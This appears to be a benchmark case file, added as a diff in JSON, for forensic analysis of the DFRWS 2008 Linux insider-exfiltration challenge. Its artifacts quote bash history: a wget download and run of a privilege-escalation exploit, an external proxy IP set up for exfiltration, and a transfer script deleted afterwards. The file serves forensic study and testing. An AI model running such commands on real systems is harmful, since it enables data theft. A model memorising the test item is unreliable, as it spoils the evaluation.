@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.1",
+  "vigia_schema": "1.0",
+  "case_id": "VIGIA-REAL-009",
+  "case_name": "DFRWS 2008 Linux Exfiltration",
+  "description": "Steve Vogon, a company employee, attempted to exfiltrate confidential data by copying files from an administrative share, compressing them, and transferring them via a Perl script through an external HTTP proxy.",
+  "incident_type": "insider_exfiltration_privilege_escalation",
+  "abstention_risk": "low",
+  "usability_tier": "build_and_test",
+  "tier_note": "Soluciones disponibles pero con restricciones. Reportar si el agente razonó o recordó.",
+  "source": {
+    "dataset": "DFRWS 2008 Forensic Challenge - Linux Memory",
+    "origin": "public_dataset",
+    "url": "https://github.com/dfrws/dfrws2008-challenge"
+  },
+  "artifacts": [
+    {
+      "artifact_id": "ART-001",
+      "content": "[stevev@goldfinger ~]$ cp /mnt/hgfs/Admin_share/acct_prem.xls . | [stevev@goldfinger ~]$ cp /mnt/hgfs/Admin_share/domain.xls . | [stevev@goldfinger ~]$ cp /mnt/hgfs/Admin_share/ftp.pcap . | zip archive.zip /mnt/hgfs/Admin_share/acct_prem.xls domain.xls ftp.pcap | ./xfer.pl archive.zip | rm xfer.pl",
+      "forensic_anomalies": [
+        "Mass copy of files from administrative share (Admin_share) to personal directory",
+        "Deletion of xfer.pl script after use (covering tracks)"
+      ],
+      "peirce_layer": "FIRSTNESS",
+      "type": "bash_history"
+    },
+    {
+      "artifact_id": "ART-002",
+      "content": "wget http://metasploit.com/users/hdm/tools/xmodulepath.tgz | tar -zpxvf xmodulepath.tgz | ./root.sh | export http_proxy='http://219.93.175.67:80'",
+      "forensic_anomalies": [
+        "Download of privilege escalation exploit from Metasploit",
+        "Configuration of external HTTP proxy (219.93.175.67) to channel exfiltration"
+      ],
+      "peirce_layer": "SECONDNESS",
+      "type": "bash_history"
+    },
+    {
+      "artifact_id": "ART-003",
+      "content": "Proxy: 219.93.175.67:80 | xfer.pl script sends archive.zip via HTTP | Exfiltration camouflaged as normal web traffic | PCAP contains HTTP traffic with cookies transporting data",
+      "forensic_anomalies": [
+        "Use of external proxy to mask exfiltration destination",
+        "Transfer of zip file with confidential data via HTTP"
+      ],
+      "peirce_layer": "SECONDNESS",
+      "type": "network_flow"
+    },
+    {
+      "artifact_id": "ART-004",
+      "content": "Processes in memory for stevev (UID 501) | linstrings: All strings mapped to user processes | linsockets: Open sockets for stevev processes | linpktscan: Network packets still resident in memory extractable to pcap",
+      "forensic_anomalies": [
+        "All suspicious strings map to the same user (stevev, UID 501)",
+        "Network packets with exfiltrated data still resident in RAM"
+      ],
+      "peirce_layer": "THIRDNESS",
+      "type": "process_list"
+    }
+  ],
+  "_consolidation": {
+    "consolidated_at": "2026-04-28T05:51:15.348885+00:00",
+    "parser_version": "1.0",
+    "schema_version": "1.0",
+    "source_file": "vigia_forensic_cases.json"
+  },
+  "_generated_at": "2026-05-29T22:16:20.145405+00:00"
+}
